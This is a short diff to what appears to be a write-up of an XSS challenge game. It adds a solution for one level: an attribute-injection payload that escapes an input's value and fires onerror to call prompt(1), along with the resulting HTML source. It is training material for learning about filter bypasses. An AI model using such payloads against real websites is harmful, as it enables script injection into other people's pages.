@@ -171,6 +171,19 @@ function escape(input) {
 }
 ```
 
+- Solution
+
+```
+" type=image src onerror
+="prompt(1)
+```
+
+- HTML Source
+
+```
+<input value="" type=image src onerror
+="prompt(1)" type="text">
+```
 
 ## Level 6
 
